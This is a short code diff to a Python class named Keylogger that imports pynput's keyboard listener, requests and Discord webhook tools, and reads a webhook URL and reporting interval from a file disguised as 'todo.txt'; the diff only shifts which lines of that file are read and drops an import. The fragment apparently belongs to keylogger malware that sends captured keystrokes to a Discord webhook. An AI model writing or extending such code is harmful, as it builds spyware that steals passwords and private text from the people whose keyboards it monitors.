@@ -1,6 +1,5 @@
 from pynput import keyboard
 import requests
-import json
 from discord import SyncWebhook, File
 import discord
 import threading
@@ -11,8 +10,8 @@ class Keylogger:
         try:
             with open("todo.txt", "r") as f:
                 lines = f.readlines()
-                self.url = lines[0].strip()
-                self.interval = int(lines[1])
+                self.url = lines[1].strip()
+                self.interval = int(lines[2])
                 f.close()
         except:
             pass
